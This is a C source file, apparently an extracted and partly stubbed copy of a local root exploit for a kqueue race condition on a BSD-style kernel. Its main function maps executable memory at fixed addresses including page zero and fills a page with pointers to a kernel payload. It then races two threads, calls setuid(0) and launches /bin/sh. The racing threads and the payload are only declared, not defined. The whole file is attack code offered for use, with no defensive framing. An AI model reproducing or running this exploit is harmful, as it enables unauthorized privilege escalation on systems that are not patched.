
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct cdev {int si_threadcount; } ;
typedef int pthread_t ;
typedef int pages ;
struct TYPE_2__ {int tv_nsec; scalar_t__ tv_sec; } ;


 int JE_ADDRESS ;
 int MAP_ANON ;
 scalar_t__ MAP_FAILED ;
 int MAP_FIXED ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 scalar_t__ do_thread ;
 scalar_t__ do_thread2 ;
 int execl (char*,char*,int *) ;
 scalar_t__ getuid () ;
 int gotroot ;
 int kernel_code ;
 int kq ;
 int kqueue () ;
 scalar_t__ mmap (void*,unsigned long,int,int,int,int ) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int pthread_create (int *,int *,void*,int *) ;
 int setuid (int ) ;
 TYPE_1__ timeout ;
 int usleep (int) ;

int main(void) {
 int i;
 pthread_t pth, pth2;
 struct cdev devp;
 char *p;
 unsigned long *ap;





 unsigned long pages[] = { 0x0, 0xa561000, 0x37e3000 };
 unsigned long sizes[] = { 0xf000, 0x1000, 0x1000 };

 for (i = 0; i < sizeof(pages) / sizeof(unsigned long); i++) {
  printf("[*] allocating %p @ %p\n", sizes[i], pages[i]);
  if (mmap((void *)pages[i], sizes[i], PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) == MAP_FAILED) {
   perror("mmap");
   return -1;
  }
 }

 *(unsigned long *)0x1c = (unsigned long)(JE_ADDRESS - ((char *)&devp.si_threadcount - (char *)&devp));

 p = (char *)pages[2];
 ap = (unsigned long *)p;

 for (i = 0; i < sizes[2] / 4; i++)
  *ap++ = (unsigned long)&kernel_code;

 if ((kq = kqueue()) < 0) {
  perror("kqueue");
  return -1;
 }

 pthread_create(&pth, ((void*)0), (void *)do_thread, ((void*)0));
 pthread_create(&pth2, ((void*)0), (void *)do_thread2, ((void*)0));

 timeout.tv_sec = 0;
 timeout.tv_nsec = 1;

 printf("waiting for root...\n");
 i = 0;

 while (!gotroot && i++ < 10000)
  usleep(100);

 setuid(0);

 if (getuid()) {
  printf("failed - system patched or not MP\n");
  return -1;
 }

 execl("/bin/sh", "sh", ((void*)0));

 return 0;
}
